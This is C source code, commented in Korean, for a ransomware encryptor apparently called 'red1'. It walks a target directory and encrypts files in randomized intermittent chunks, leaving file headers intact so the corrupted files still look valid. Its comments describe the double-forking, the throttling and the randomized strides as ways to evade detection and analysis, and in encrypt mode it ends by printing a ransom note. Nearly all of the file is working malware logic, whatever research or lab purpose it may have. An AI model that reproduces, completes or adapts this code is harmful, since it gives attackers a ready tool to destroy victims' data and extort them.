#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>    // strcasecmp
#include <unistd.h>     // fork, waitpid
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/time.h>   // 시간 측정
#include <dirent.h>
#include <limits.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/mman.h>   // 공유 메모리
#include <stdarg.h>

#include "red1_crypto.h"     
#include "red1_file_ops.h"   
#include "red1_utils.h"      

// 청크 크기: 128KB (탐지 임계값을 고려한 최적값)
#define CHUNK_SIZE (128 * 1024)

// 기본 건너뛰기 크기 (1:2 비율)
#define STRIDE_SKIP (CHUNK_SIZE * 2)

// 랜덤 스트라이드 비율 정의 (탐지 패턴 교란용)
#define SKIP_RATIO_2 (CHUNK_SIZE * 2) // 1:2
#define SKIP_RATIO_3 (CHUNK_SIZE * 3) // 1:3

// 헤더 내 시그니처 보존 크기 (Magic Bytes 보호)
#define MAGIC_BYTES_SKIP 16

// 단일 프로세스에서 수행할 최대 쓰기 횟수
#define MAX_WRITES_PER_PID 10

#define MAX_FILES 10000

// 동시 실행 프로세스 제한 (병렬성을 버리고 조용하게 암호화, CPU 점유율 최소화)
#define MAX_CONCURRENT_PROCS 1 

// System V 세마포어 ID (프로세스 동기화)
static int g_sem_id = -1;
static int *g_success_count = NULL; 

union semun {
    int val;
    struct semid_ds *buf;
    unsigned short *array;
};

/**
 * @brief 암호화 시작 오프셋 계산 (헤더 보존)
 * 파일의 시그니처(Magic Bytes)를 보존하여 정상파일로 오인하도록 만듦
 */
long calculate_safe_start_offset(const char *filename, long filesize) {
    // 파일이 너무 작으면(최소한의 헤더 구조도 없으면) 스킵
    if (filesize < 64) return filesize; 
    
    // 시그니처(Magic Bytes) 16바이트 건너뛰고 17번째 바이트부터 암호화
    // 결과: OS는 파일 형식을 인식하지만, 내부는 완전히 깨짐
    return MAGIC_BYTES_SKIP; 
}

static void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [mode]\n", prog_name);
    fprintf(stderr, "Modes:\n");
    fprintf(stderr, "  -e    Encrypt mode\n");
    fprintf(stderr, "  -d    Decrypt mode\n");
}

// 세마포어 P 연산 (자원 획득)
void reserve_process_slot() {
    struct sembuf sops;
    sops.sem_num = 0;
    sops.sem_op  = -1; 
    sops.sem_flg = SEM_UNDO; 
    
    if (semop(g_sem_id, &sops, 1) == -1) {
        perror("reserve_process_slot failed");
        exit(1);
    }
}

// 세마포어 V 연산 (자원 반납)
void release_process_slot() {
    struct sembuf sops;
    sops.sem_num = 0;
    sops.sem_op  = 1; 
    sops.sem_flg = SEM_UNDO; 
    
    if (semop(g_sem_id, &sops, 1) == -1) {
        perror("release_process_slot failed");
    }
}

int init_semaphore(int max_procs) {
    g_sem_id = semget(IPC_PRIVATE, 1, IPC_CREAT | 0666);
    if (g_sem_id == -1) {
        perror("semget failed");
        return -1;
    }
    union semun arg;
    arg.val = max_procs;
    if (semctl(g_sem_id, 0, SETVAL, arg) == -1) {
        perror("semctl failed");
        return -1;
    }
    return 0;
}

void destroy_semaphore() {
    if (g_sem_id != -1) semctl(g_sem_id, 0, IPC_RMID);
}

void write_log(const char *format, ...) {
    va_list args;
    FILE *fp =fopen("execution.log", "a");
    if (fp != NULL) {
        va_start(args, format);
        vfprintf(fp, format, args);
        va_end(args);
        fclose(fp);
    }
}

/**
 * @brief Double Fork를 이용한 Worker 프로세스 생성
 * 이중 포크 이후 생성되는 프로세스(Child 2)의 부모(Child 1)를 종료시켜 고아로 만든다.
 * -> 부모 프로세스 추적을 피하기 위함.
 */
static int spawn_worker(const char *target, long offset, int chunks, long stride, int mode) {
    pid_t pid = fork();

    if (pid < 0) {
        perror("First fork failed");
        return 1;
    }

    if (pid == 0) {
        // [Child 1]
        if (setsid() < 0) {} // 세션 분리
        
        pid_t grand_pid = fork(); // Double Fork
        if (grand_pid < 0) _exit(1);
        
        if (grand_pid == 0) {
            // [Child 2]: Actual Worker
            reserve_process_slot();
            
            int ret;
            if (mode == 0) {
                ret = encrypt_chunk_stride(target, offset, chunks, CHUNK_SIZE, stride);
            } else {
                ret = decrypt_chunk_stride(target, offset, chunks, CHUNK_SIZE, stride);
            }

            if (ret == 0 && g_success_count != NULL) {
                __sync_fetch_and_add(g_success_count, 1); 
            }

            release_process_slot(); 

            if (ret != 0) _exit(1);
            _exit(0);
        }
        _exit(0); // Child 1 즉시 종료
    } else {
        int status;
        waitpid(pid, &status, 0);
        return 0;
    }
}

void execute_attack(int mode) {
    for (int i = 0; i < file_count; i++) {
        print_progress_bar(i, file_count);

        char *target = file_queue[i];

        struct stat st;
        if (stat(target, &st) != 0) continue; 
        
        long total_size = st.st_size;
        if (total_size <= 0) continue;

        // 시그니처만 건너뛴 위치(16)부터 시작
        long current_offset = calculate_safe_start_offset(target, total_size);
        if (current_offset >= total_size) continue; // 너무 작은 파일 스킵

        write_log("[TARGET] %s (Size: %ld) 시작 - 헤더 타격 (Offset: %ld)\n",
               target, total_size, current_offset);

        int child_round = 0;
        int attack_failed = 0;
        
        if (g_success_count) *g_success_count = 0;
        int expected_successes = 0;
        
        
        // =================================================================
        //  파일별 고유 시드 생성 (파일명 해싱)
        // -> 암호화(-e)와 복호화(-d) 시 동일한 랜덤 패턴을 보장하기 위함
        
        // (설명) 문자열 해시 djb2 알고리즘의 표준 시작 값: 5381
        // 문자열이 뭉치지 않고 가장 골고루 잘 섞인다는 것이 입증되어 표준처럼 굳어짐
        // =================================================================
        unsigned int seed = 5381;
        for (int k = 0; target[k] != '\0'; k++) {
            seed = ((seed << 5) + seed) + target[k]; 
        }
        srand(seed);

        // 파일 청크 처리 루프
        while (current_offset < total_size) {
            
            // 세마포어 슬롯 대기
            int wait_retries = 0;
            while (1) {
                int val = semctl(g_sem_id, 0, GETVAL);
                if (val > 0) break; 
                
                usleep(1000); 
                wait_retries++;
                if (wait_retries > 5000) {
                    // 프로세스가 5초 이상 안돌아올 시 세마포어 자원 강제 반환
                    release_process_slot();
                    wait_retries = 0;
                }
            }
            
            // Worker에게 할당할 랜덤 비율 결정 (1:2 또는 1:3)
            // -> 파일 내부의 암호화 패턴을 불규칙하게 만들어 분석 방해
            int use_ratio_3 = rand() % 2; 
            long current_stride = use_ratio_3 ? SKIP_RATIO_3 : SKIP_RATIO_2;

            // 결정된 stride에 맞춰 이번 PID가 처리할 실제 바이트 수 계산
            long bytes_this_pid = (long)MAX_WRITES_PER_PID * (CHUNK_SIZE + current_stride);
           
            // Double Fork Worker 투입
            int ret = spawn_worker(target, current_offset, MAX_WRITES_PER_PID, STRIDE_SKIP, mode);
            child_round++;
            expected_successes++; 
            
            if (ret != 0) {
                attack_failed = 1;
                usleep(500000); 
                break; 
            }
            
            // 다음 오프셋으로 이동
            current_offset += bytes_this_pid;
            // Worker 간 간섭 방지와 느린 암호화를 위한 미세 딜레이
            usleep(200000); 
        }

        // Tail(남은 자투리 영역) 처리
        if (!attack_failed && current_offset < total_size) {
             while (1) {
                int val = semctl(g_sem_id, 0, GETVAL);
                if (val > 0) break;
                usleep(1000);
            }
            int ret = spawn_worker(target, current_offset, 1, STRIDE_SKIP, mode);
            if (ret == 0) {
                child_round++;
                expected_successes++;
            }
        }

        // 모든 Worker 종료 대기
        int finish_wait = 0;
        while (1) {
            int val = semctl(g_sem_id, 0, GETVAL);
            if (val == -1 || val >= MAX_CONCURRENT_PROCS) break;
            usleep(10000); 
            finish_wait++;
            if (finish_wait > 500) break;
        }

        // 결과 로깅
        if (!attack_failed) {
            int successes = (g_success_count) ? *g_success_count : 0;
            if (successes == expected_successes) { 
                write_log("[COMPLETE] %s 완료\n", target);
            } else {
                write_log("[KILLED] %s (시도: %d, 성공: %d)\n", target, expected_successes, successes);
            }
        } else {
            write_log("[STOP] %s 처리 중단됨\n", target);
            printf("[STOP] %s 처리 도중 중단됨\n", target);
        }
    }
    print_progress_bar(file_count, file_count);
}

int main(int argc, char *argv[]) {
    struct timeval start_time, end_time;
    gettimeofday(&start_time, NULL);

    FILE *fp_reset = fopen("execution.log", "w");
    if (fp_reset != NULL) fclose(fp_reset);

    if (argc != 2) { 
        fprintf(stderr, "Error: Invalid arguments.\n\n");
        print_usage(argv[0]);
        return 1;
    }

    int mode;
    if (strcmp(argv[1], "-e") == 0) mode = 0;
    else if (strcmp(argv[1], "-d") == 0) mode = 1;
    else {
        fprintf(stderr, "Error: Invalid mode '%s'\n\n", argv[1]);
        print_usage(argv[0]);
        return 1;
    }

    // 환경 변수 기반 타겟 설정
    const char *home_dir = getenv("HOME");
    if (!home_dir) {
        fprintf(stderr, "Error: HOME environment variable not set.\n");
        return 1;
    }
    
    char start_path[PATH_MAX];
    if (snprintf(start_path, sizeof(start_path),
             "%s/workspace/target", home_dir) >= (int)sizeof(start_path)) {
        fprintf(stderr, "Error: Target path is too long.\n");
        return 1;
    }
    
    printf("======= %s를 시작합니다. =======\n\n", (mode == 0 ) ? "암호화" : "복호화");
    write_log("--- Start Traversal ---\n");
    write_log("  Target Mode: %s\n", (mode == 0) ? "ENCRYPT" : "DECRYPT");
    write_log("  Target Path: %s\n", start_path);
    write_log("------------------------\n");
    
    // 디렉터리 스캔 (재귀적 탐색)
    scan_directory_recursive(start_path);
    write_log(">>> Found %d files\n", file_count);

    // 공유 메모리 초기화 (성공 카운트 공유용)
    g_success_count = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, 
                           MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (g_success_count == MAP_FAILED) {
        perror("mmap failed");
        return 1;
    }

    // 세마포어 초기화
    if (init_semaphore(MAX_CONCURRENT_PROCS) == -1) {
        return 1;
    }

    // 공격 실행
    execute_attack(mode); 

    // 잔여 Worker 대기
    write_log(">>> Waiting for remaining workers...\n");
    int max_retries = 30; 
    while (max_retries > 0) {
        int val = semctl(g_sem_id, 0, GETVAL);
        if (val == -1 || val >= MAX_CONCURRENT_PROCS) break;
        usleep(100000); 
        max_retries--;
    }

    // 자원 해제
    destroy_semaphore();
    munmap(g_success_count, sizeof(int));

    write_log("------------------------\n");
    
    gettimeofday(&end_time, NULL);
    double elapsed_sec = (end_time.tv_sec - start_time.tv_sec) + 
                         (end_time.tv_usec - start_time.tv_usec) / 1000000.0;

    write_log("\n");
    write_log("========================================\n");
    write_log(" [TIMING] Total Execution Time: %.4f sec\n", elapsed_sec);
    write_log("========================================\n");
    printf("\n\n======= %s 완료! =======\n", (mode == 0 ) ? "암호화" : "복호화");
    if (mode == 0) print_ransom_note();
    return 0;
}